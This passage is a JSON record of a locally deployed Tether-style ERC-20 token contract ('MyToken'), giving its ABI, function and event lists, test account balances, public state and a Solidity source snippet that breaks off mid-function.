"function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x6eD79Aa1c71FD7BdBC515EfdA3Bd4e26394435cC": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() 